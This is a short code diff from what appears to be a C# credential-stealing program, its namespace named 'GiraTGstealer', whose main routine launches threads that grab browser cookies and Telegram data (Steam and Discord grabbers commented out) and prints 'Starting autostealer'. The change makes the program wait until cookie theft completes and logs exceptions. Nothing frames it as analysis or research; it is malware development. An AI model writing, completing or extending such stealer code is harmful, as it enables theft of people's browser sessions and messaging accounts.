@@ -31,14 +31,17 @@ namespace GiraTGstealer
                 new Thread(Cookies.start),
                 new Thread(TelegramGrabber.get),
                 //new Thread(DiscordGrabber.get),
-                new Thread(SteamGrabber.get)
+                //new Thread(SteamGrabber.get)
             };
             Console.WriteLine("🌹 Starting autostealer...");
             foreach(Thread t in thread) 
             {
                 t.Start();
             }
-            Thread.Sleep(20 * 1000);
+            while (!Cookies.complete)
+            {
+                Thread.Sleep(20 * 1000);
+            }
             Console.WriteLine("🥀 Stopping autostealer...");
             foreach (Thread t in thread)
             {
@@ -48,7 +51,9 @@ namespace GiraTGstealer
                     {
                         t.Abort();
                     }
-                    catch { }
+                    catch (Exception ex){
+                        Console.WriteLine(ex.ToString());
+                    }
                 }
             }
         }
